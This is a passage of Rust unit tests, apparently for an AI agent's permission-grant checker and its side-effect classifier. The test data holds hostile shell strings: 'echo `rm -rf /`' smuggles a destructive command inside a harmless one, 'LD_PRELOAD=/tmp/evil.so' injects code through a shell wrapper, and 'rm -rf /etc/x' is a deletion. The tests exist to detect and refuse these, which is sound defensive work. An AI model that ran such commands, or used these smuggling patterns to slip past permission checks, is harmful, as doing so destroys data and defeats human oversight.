                "{cmd} must not ride a head grant"
            );
        }
        // A broad grant means "any command", so it is deliberately unaffected.
        assert!(grant_covers_command(
            "Bash",
            "echo `rm -rf /`",
            granted(&["Bash"])
        ));
        // And the ordinary forms of those same heads are still covered.
        for cmd in ["echo ok", "ls -la", "grep x data/f", "sort data/f"] {
            assert!(grant_covers_command("Bash", cmd, all), "{cmd}");
        }
    }

    /// Same reason, for the other half of the grant lane's refusal.
    #[test]
    fn code_injecting_env_is_detected_inside_a_shell_wrapper() {
        let granted = |p: &str| p == "Bash(ls:*)";
        assert!(!grant_covers_command(
            "Bash",
            "bash -lc 'LD_PRELOAD=/tmp/evil.so ls'",
            granted
        ));
        assert!(grant_covers_command("Bash", "bash -lc 'FOO=1 ls'", granted));
    }

    // --- Static side-effect category (trigger grant key + fallback summary) ---

    #[test]
    fn static_side_effect_category_maps_each_kind() {
        use SideEffectCategory::*;
        assert_eq!(
            static_side_effect_category("curl -X POST https://api/charge"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("wget --post-data='x=1' https://api/pay"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("echo body | mail -s subj a@b.com"),
            Some(Email)
        );
        assert_eq!(
            static_side_effect_category("osascript -e 'tell application \"Mail\" to send'"),
            Some(Email)
        );
        assert_eq!(
            static_side_effect_category("gh pr create --fill"),
            Some(CloudCli)
        );
        assert_eq!(
            static_side_effect_category("aws s3 rm s3://b/k"),
            Some(CloudCli)
        );
        // Python shapes.
        assert_eq!(
            static_side_effect_category("import requests; requests.post(u)"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("import smtplib; smtplib.SMTP('x')"),
            Some(Email)
        );
        // A plain GET / unknown command has no static category.
        assert_eq!(static_side_effect_category("curl https://x"), None);
        assert_eq!(static_side_effect_category("npm install"), None);
        // Out-of-workspace destruction is judge-only — never static.
        assert_eq!(static_side_effect_category("rm -rf /etc/x"), None);
    }
}
